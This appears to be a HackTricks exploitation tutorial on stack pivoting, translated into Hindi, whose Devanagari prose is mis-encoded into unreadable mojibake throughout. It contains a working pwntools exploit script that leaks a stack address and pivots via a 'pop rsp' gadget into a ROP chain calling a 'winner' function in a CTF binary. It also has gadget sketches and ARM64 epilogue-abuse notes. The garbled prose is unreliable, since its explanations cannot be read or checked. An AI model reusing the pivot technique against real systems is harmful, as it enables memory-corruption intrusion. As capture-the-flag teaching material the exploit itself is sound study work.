### **`pop rsp`** ‡§ó‡•à‡§ú‡•á‡§ü

[**‡§á‡§∏ ‡§™‡•É‡§∑‡•ç‡§† ‡§™‡§∞**](https://ir0nstone.gitbook.io/notes/types/stack/stack-pivoting/exploitation/pop-rsp) ‡§Ü‡§™ ‡§á‡§∏ ‡§§‡§ï‡§®‡•Ä‡§ï ‡§ï‡§æ ‡§è‡§ï ‡§â‡§¶‡§æ‡§π‡§∞‡§£ ‡§™‡§æ ‡§∏‡§ï‡§§‡•á ‡§π‡•à‡§Ç‡•§ ‡§á‡§∏ ‡§ö‡•Å‡§®‡•å‡§§‡•Ä ‡§ï‡•á ‡§≤‡§ø‡§è 2 ‡§µ‡§ø‡§∂‡§ø‡§∑‡•ç‡§ü ‡§§‡§∞‡•ç‡§ï‡•ã‡§Ç ‡§ï‡•á ‡§∏‡§æ‡§• ‡§è‡§ï ‡§´‡§º‡§Ç‡§ï‡•ç‡§∂‡§® ‡§ï‡•ã ‡§ï‡•â‡§≤ ‡§ï‡§∞‡§®‡§æ ‡§Ü‡§µ‡§∂‡•ç‡§Ø‡§ï ‡§•‡§æ, ‡§î‡§∞ ‡§µ‡§π‡§æ‡§Å ‡§è‡§ï **`pop rsp` ‡§ó‡•à‡§ú‡•á‡§ü** ‡§•‡§æ ‡§î‡§∞ ‡§µ‡§π‡§æ‡§Å **‡§∏‡•ç‡§ü‡•à‡§ï ‡§∏‡•á ‡§≤‡•Ä‡§ï** ‡§π‡•à:
```python
# Code from https://ir0nstone.gitbook.io/notes/types/stack/stack-pivoting/exploitation/pop-rsp
# This version has added comments

from pwn import *

elf = context.binary = ELF('./vuln')
p = process()

p.recvuntil('to: ')
buffer = int(p.recvline(), 16) # Leak from the stack indicating where is the input of the user
log.success(f'Buffer: {hex(buffer)}')

POP_CHAIN = 0x401225       # pop all of: RSP, R13, R14, R15, ret
POP_RDI = 0x40122b
POP_RSI_R15 = 0x401229     # pop RSI and R15

# The payload starts
payload = flat(
0,                 # r13
0,                 # r14
0,                 # r15
POP_RDI,
0xdeadbeef,
POP_RSI_R15,
0xdeadc0de,
0x0,               # r15
elf.sym['winner']
)

payload = payload.ljust(104, b'A')     # pad to 104

# Start popping RSP, this moves the stack to the leaked address and
# continues the ROP chain in the prepared payload
payload += flat(
POP_CHAIN,
buffer             # rsp
)

pause()
p.sendline(payload)
print(p.recvline())
```
### xchg \<reg>, rsp gadget
```
pop <reg>                <=== return pointer
<reg value>
xchg <reg>, rsp
```
### jmp esp

‡§Ø‡§π‡§æ‡§Å ret2esp ‡§§‡§ï‡§®‡•Ä‡§ï ‡§ï‡•Ä ‡§ú‡§æ‡§Å‡§ö ‡§ï‡§∞‡•á‡§Ç:

{% content-ref url="../rop-return-oriented-programing/ret2esp-ret2reg.md" %}
[ret2esp-ret2reg.md](../rop-return-oriented-programing/ret2esp-ret2reg.md)
{% endcontent-ref %}

## ‡§∏‡§Ç‡§¶‡§∞‡•ç‡§≠ ‡§î‡§∞ ‡§Ö‡§®‡•ç‡§Ø ‡§â‡§¶‡§æ‡§π‡§∞‡§£

* [https://bananamafia.dev/post/binary-rop-stackpivot/](https://bananamafia.dev/post/binary-rop-stackpivot/)
* [https://ir0nstone.gitbook.io/notes/types/stack/stack-pivoting](https://ir0nstone.gitbook.io/notes/types/stack/stack-pivoting)
* [https://guyinatuxedo.github.io/17-stack\_pivot/dcquals19\_speedrun4/index.html](https://guyinatuxedo.github.io/17-stack\_pivot/dcquals19\_speedrun4/index.html)
* 64 ‡§¨‡§ø‡§ü‡•ç‡§∏, ‡§è‡§ï rop ‡§∂‡•ç‡§∞‡•É‡§Ç‡§ñ‡§≤‡§æ ‡§ï‡•á ‡§∏‡§æ‡§• ‡§è‡§ï ret sled ‡§∏‡•á ‡§∂‡•Å‡§∞‡•Ç ‡§π‡•ã‡§®‡•á ‡§µ‡§æ‡§≤‡§æ ‡§ë‡§´ ‡§¨‡§æ‡§Ø ‡§µ‡§® ‡§∂‡•ã‡§∑‡§£
* [https://guyinatuxedo.github.io/17-stack\_pivot/insomnihack18\_onewrite/index.html](https://guyinatuxedo.github.io/17-stack\_pivot/insomnihack18\_onewrite/index.html)
* 64 ‡§¨‡§ø‡§ü, ‡§ï‡•ã‡§à relro, canary, nx ‡§î‡§∞ pie ‡§®‡§π‡•Ä‡§Ç‡•§ ‡§™‡•ç‡§∞‡•ã‡§ó‡•ç‡§∞‡§æ‡§Æ ‡§∏‡•ç‡§ü‡•à‡§ï ‡§Ø‡§æ pie ‡§ï‡•á ‡§≤‡§ø‡§è ‡§è‡§ï ‡§≤‡•Ä‡§ï ‡§™‡•ç‡§∞‡§¶‡§æ‡§® ‡§ï‡§∞‡§§‡§æ ‡§π‡•à ‡§î‡§∞ ‡§è‡§ï qword ‡§ï‡§æ WWW‡•§ ‡§™‡§π‡§≤‡•á ‡§∏‡•ç‡§ü‡•à‡§ï ‡§≤‡•Ä‡§ï ‡§™‡•ç‡§∞‡§æ‡§™‡•ç‡§§ ‡§ï‡§∞‡•á‡§Ç ‡§î‡§∞ pie ‡§≤‡•Ä‡§ï ‡§™‡•ç‡§∞‡§æ‡§™‡•ç‡§§ ‡§ï‡§∞‡§®‡•á ‡§ï‡•á ‡§≤‡§ø‡§è WWW ‡§ï‡§æ ‡§â‡§™‡§Ø‡•ã‡§ó ‡§ï‡§∞‡•á‡§Ç‡•§ ‡§´‡§ø‡§∞ WWW ‡§ï‡§æ ‡§â‡§™‡§Ø‡•ã‡§ó ‡§ï‡§∞‡§ï‡•á ‡§è‡§ï ‡§∂‡§æ‡§∂‡•ç‡§µ‡§§ ‡§≤‡•Ç‡§™ ‡§¨‡§®‡§æ‡§è‡§Ç ‡§ú‡•ã `.fini_array` ‡§™‡•ç‡§∞‡§µ‡§ø‡§∑‡•ç‡§ü‡§ø‡§Ø‡•ã‡§Ç ‡§ï‡§æ ‡§¶‡•Å‡§∞‡•Å‡§™‡§Ø‡•ã‡§ó ‡§ï‡§∞‡§§‡§æ ‡§π‡•à + `__libc_csu_fini` ‡§ï‡•ã ‡§ï‡•â‡§≤ ‡§ï‡§∞‡§§‡§æ ‡§π‡•à ([‡§Ø‡§π‡§æ‡§Å ‡§Ö‡§ß‡§ø‡§ï ‡§ú‡§æ‡§®‡§ï‡§æ‡§∞‡•Ä](../arbitrary-write-2-exec/www2exec-.dtors-and-.fini\_array.md)). ‡§á‡§∏ "‡§∂‡§æ‡§∂‡•ç‡§µ‡§§" ‡§≤‡•á‡§ñ‡§® ‡§ï‡§æ ‡§¶‡•Å‡§∞‡•Å‡§™‡§Ø‡•ã‡§ó ‡§ï‡§∞‡§§‡•á ‡§π‡•Å‡§è, .bss ‡§Æ‡•á‡§Ç ‡§è‡§ï ROP ‡§∂‡•ç‡§∞‡•É‡§Ç‡§ñ‡§≤‡§æ ‡§≤‡§ø‡§ñ‡•Ä ‡§ú‡§æ‡§§‡•Ä ‡§π‡•à ‡§î‡§∞ ‡§Ö‡§Ç‡§§‡§§‡§É ‡§á‡§∏‡•á RBP ‡§ï‡•á ‡§∏‡§æ‡§• ‡§™‡§ø‡§µ‡§ü‡§ø‡§Ç‡§ó ‡§ï‡§∞‡§®‡•á ‡§ï‡•á ‡§≤‡§ø‡§è ‡§ï‡•â‡§≤ ‡§ï‡§ø‡§Ø‡§æ ‡§ú‡§æ‡§§‡§æ ‡§π‡•à‡•§

## ARM64

ARM64 ‡§Æ‡•á‡§Ç, ‡§ï‡§æ‡§∞‡•ç‡§Ø‡•ã‡§Ç ‡§ï‡•á **‡§™‡•ç‡§∞‡•ã‡§≤‡•â‡§ó ‡§î‡§∞ ‡§è‡§™‡§ø‡§≤‡•â‡§ó** ‡§∏‡•ç‡§ü‡•à‡§ï ‡§Æ‡•á‡§Ç **SP ‡§∞‡§ú‡§ø‡§∏‡•ç‡§ü‡§∞** ‡§ï‡•ã ‡§∏‡•ç‡§ü‡•ã‡§∞ ‡§î‡§∞ ‡§™‡•Å‡§®‡§É ‡§™‡•ç‡§∞‡§æ‡§™‡•ç‡§§ ‡§®‡§π‡•Ä‡§Ç ‡§ï‡§∞‡§§‡•á ‡§π‡•à‡§Ç‡•§ ‡§á‡§∏‡§ï‡•á ‡§Ö‡§≤‡§æ‡§µ‡§æ, **`RET`** ‡§®‡§ø‡§∞‡•ç‡§¶‡•á‡§∂ SP ‡§¶‡•ç‡§µ‡§æ‡§∞‡§æ ‡§á‡§Ç‡§ó‡§ø‡§§ ‡§™‡§§‡•á ‡§™‡§∞ ‡§µ‡§æ‡§™‡§∏ ‡§®‡§π‡•Ä‡§Ç ‡§≤‡•å‡§ü‡§§‡§æ, ‡§¨‡§≤‡•ç‡§ï‡§ø **`x30`** ‡§ï‡•á ‡§Ö‡§Ç‡§¶‡§∞ ‡§ï‡•á ‡§™‡§§‡•á ‡§™‡§∞ ‡§≤‡•å‡§ü‡§§‡§æ ‡§π‡•à‡•§

‡§á‡§∏‡§≤‡§ø‡§è, ‡§°‡§ø‡§´‡§º‡•â‡§≤‡•ç‡§ü ‡§∞‡•Ç‡§™ ‡§∏‡•á, ‡§ï‡•á‡§µ‡§≤ ‡§è‡§™‡§ø‡§≤‡•â‡§ó ‡§ï‡§æ ‡§¶‡•Å‡§∞‡•Å‡§™‡§Ø‡•ã‡§ó ‡§ï‡§∞‡§ï‡•á ‡§Ü‡§™ **SP ‡§∞‡§ú‡§ø‡§∏‡•ç‡§ü‡§∞** ‡§ï‡•ã ‡§®‡§ø‡§Ø‡§Ç‡§§‡•ç‡§∞‡§ø‡§§ ‡§ï‡§∞‡§®‡•á ‡§Æ‡•á‡§Ç ‡§∏‡§ï‡•ç‡§∑‡§Æ ‡§®‡§π‡•Ä‡§Ç ‡§π‡•ã‡§Ç‡§ó‡•á, ‡§ï‡•Å‡§õ ‡§°‡•á‡§ü‡§æ ‡§ï‡•ã ‡§∏‡•ç‡§ü‡•à‡§ï ‡§ï‡•á ‡§Ö‡§Ç‡§¶‡§∞ ‡§ì‡§µ‡§∞‡§∞‡§æ‡§á‡§ü ‡§ï‡§∞‡§ï‡•á‡•§ ‡§î‡§∞ ‡§Ø‡§¶‡§ø ‡§Ü‡§™ SP ‡§ï‡•ã ‡§®‡§ø‡§Ø‡§Ç‡§§‡•ç‡§∞‡§ø‡§§ ‡§ï‡§∞‡§®‡•á ‡§Æ‡•á‡§Ç ‡§∏‡§´‡§≤ ‡§π‡•ã ‡§ú‡§æ‡§§‡•á ‡§π‡•à‡§Ç, ‡§§‡•ã ‡§≠‡•Ä ‡§Ü‡§™‡§ï‡•ã **`x30`** ‡§∞‡§ú‡§ø‡§∏‡•ç‡§ü‡§∞ ‡§ï‡•ã ‡§®‡§ø‡§Ø‡§Ç‡§§‡•ç‡§∞‡§ø‡§§ ‡§ï‡§∞‡§®‡•á ‡§ï‡§æ ‡§è‡§ï ‡§§‡§∞‡•Ä‡§ï‡§æ ‡§ö‡§æ‡§π‡§ø‡§è‡•§

*   ‡§™‡•ç‡§∞‡•ã‡§≤‡•â‡§ó

```armasm
sub sp, sp, 16
stp x29, x30, [sp]      // [sp] = x29; [sp + 8] = x30
mov x29, sp             // FP ‡§´‡•ç‡§∞‡•á‡§Æ ‡§∞‡§ø‡§ï‡•â‡§∞‡•ç‡§° ‡§ï‡•Ä ‡§ì‡§∞ ‡§á‡§∂‡§æ‡§∞‡§æ ‡§ï‡§∞‡§§‡§æ ‡§π‡•à
```
*   ‡§è‡§™‡§ø‡§≤‡•â‡§ó

```armasm
ldp x29, x30, [sp]      // x29 = [sp]; x30 = [sp + 8]
add sp, sp, 16
ret
```

{% hint style="danger" %}
ARM64 ‡§Æ‡•á‡§Ç ‡§∏‡•ç‡§ü‡•à‡§ï ‡§™‡§ø‡§µ‡§ü‡§ø‡§Ç‡§ó ‡§ï‡•á ‡§∏‡§Æ‡§æ‡§® ‡§ï‡•Å‡§õ ‡§ï‡§∞‡§®‡•á ‡§ï‡§æ ‡§§‡§∞‡•Ä‡§ï‡§æ ‡§π‡•ã‡§ó‡§æ **`SP`** ‡§ï‡•ã ‡§®‡§ø‡§Ø‡§Ç‡§§‡•ç‡§∞‡§ø‡§§ ‡§ï‡§∞‡§®‡§æ (‡§ï‡§ø‡§∏‡•Ä ‡§∞‡§ú‡§ø‡§∏‡•ç‡§ü‡§∞ ‡§ï‡•ã ‡§®‡§ø‡§Ø‡§Ç‡§§‡•ç‡§∞‡§ø‡§§ ‡§ï‡§∞‡§ï‡•á ‡§ú‡§ø‡§∏‡§ï‡§æ ‡§Æ‡§æ‡§® `SP` ‡§ï‡•ã ‡§™‡§æ‡§∏ ‡§ï‡§ø‡§Ø‡§æ ‡§ú‡§æ‡§§‡§æ ‡§π‡•à ‡§Ø‡§æ ‡§ï‡•ç‡§Ø‡•ã‡§Ç‡§ï‡§ø ‡§ï‡§ø‡§∏‡•Ä ‡§ï‡§æ‡§∞‡§£ ‡§∏‡•á `SP` ‡§Ö‡§™‡§®‡§æ ‡§™‡§§‡§æ ‡§∏‡•ç‡§ü‡•à‡§ï ‡§∏‡•á ‡§≤‡•á ‡§∞‡§π‡§æ ‡§π‡•à ‡§î‡§∞ ‡§π‡§Æ‡§æ‡§∞‡•á ‡§™‡§æ‡§∏ ‡§è‡§ï ‡§ì‡§µ‡§∞‡§´‡•ç‡§≤‡•ã ‡§π‡•à) ‡§î‡§∞ ‡§´‡§ø‡§∞ **‡§è‡§™‡§ø‡§≤‡•â‡§ó ‡§ï‡§æ ‡§¶‡•Å‡§∞‡•Å‡§™‡§Ø‡•ã‡§ó** ‡§ï‡§∞‡§ï‡•á **`x30`** ‡§∞‡§ú‡§ø‡§∏‡•ç‡§ü‡§∞ ‡§ï‡•ã **‡§®‡§ø‡§Ø‡§Ç‡§§‡•ç‡§∞‡§ø‡§§ `SP`** ‡§∏‡•á ‡§≤‡•ã‡§° ‡§ï‡§∞‡§®‡§æ ‡§î‡§∞ **`RET`** ‡§ï‡§∞‡§®‡§æ‡•§
{% endhint %}

‡§á‡§∏‡§ï‡•á ‡§Ö‡§≤‡§æ‡§µ‡§æ, ‡§Ü‡§™ ‡§®‡§ø‡§Æ‡•ç‡§®‡§≤‡§ø‡§ñ‡§ø‡§§ ‡§™‡•É‡§∑‡•ç‡§† ‡§™‡§∞ **ARM64 ‡§Æ‡•á‡§Ç Ret2esp** ‡§ï‡§æ ‡§∏‡§Æ‡§ï‡§ï‡•ç‡§∑ ‡§¶‡•á‡§ñ ‡§∏‡§ï‡§§‡•á ‡§π‡•à‡§Ç:

{% content-ref url="../rop-return-oriented-programing/ret2esp-ret2reg.md" %}
[ret2esp-ret2reg.md](../rop-return-oriented-programing/ret2esp-ret2reg.md)
{% endcontent-ref %}

{% hint style="success" %}
AWS ‡§π‡•à‡§ï‡§ø‡§Ç‡§ó ‡§∏‡•Ä‡§ñ‡•á‡§Ç ‡§î‡§∞ ‡§Ö‡§≠‡•ç‡§Ø‡§æ‡§∏ ‡§ï‡§∞‡•á‡§Ç:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
GCP ‡§π‡•à‡§ï‡§ø‡§Ç‡§ó ‡§∏‡•Ä‡§ñ‡•á‡§Ç ‡§î‡§∞ ‡§Ö‡§≠‡•ç‡§Ø‡§æ‡§∏ ‡§ï‡§∞‡•á‡§Ç: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricks ‡§ï‡§æ ‡§∏‡§Æ‡§∞‡•ç‡§•‡§® ‡§ï‡§∞‡•á‡§Ç</summary>

* [**‡§∏‡§¶‡§∏‡•ç‡§Ø‡§§‡§æ ‡§Ø‡•ã‡§ú‡§®‡§æ‡§è‡§Å**](https://github.com/sponsors/carlospolop) ‡§¶‡•á‡§ñ‡•á‡§Ç!
* **üí¨ [**Discord ‡§∏‡§Æ‡•Ç‡§π**](https://discord.gg/hRep4RUj7f) ‡§Ø‡§æ [**‡§ü‡•á‡§≤‡•Ä‡§ó‡•ç‡§∞‡§æ‡§Æ ‡§∏‡§Æ‡•Ç‡§π**](https://t.me/peass) ‡§Æ‡•á‡§Ç ‡§∂‡§æ‡§Æ‡§ø‡§≤ ‡§π‡•ã‡§Ç ‡§Ø‡§æ **Twitter** ‡§™‡§∞ ‡§π‡§Æ‡•á‡§Ç **‡§´‡•â‡§≤‡•ã ‡§ï‡§∞‡•á‡§Ç** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* ‡§π‡•à‡§ï‡§ø‡§Ç‡§ó ‡§ü‡•ç‡§∞‡§ø‡§ï‡•ç‡§∏ ‡§∏‡§æ‡§ù‡§æ ‡§ï‡§∞‡•á‡§Ç ‡§î‡§∞ [**HackTricks**](https://github.com/carlospolop/hacktricks) ‡§î‡§∞ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) ‡§ó‡§ø‡§ü‡§π‡§¨ ‡§∞‡§ø‡§™‡•ã‡§ú‡§ø‡§ü‡§∞‡•Ä ‡§Æ‡•á‡§Ç PR ‡§∏‡§¨‡§Æ‡§ø‡§ü ‡§ï‡§∞‡•á‡§Ç‡•§

</details>
{% endhint %}
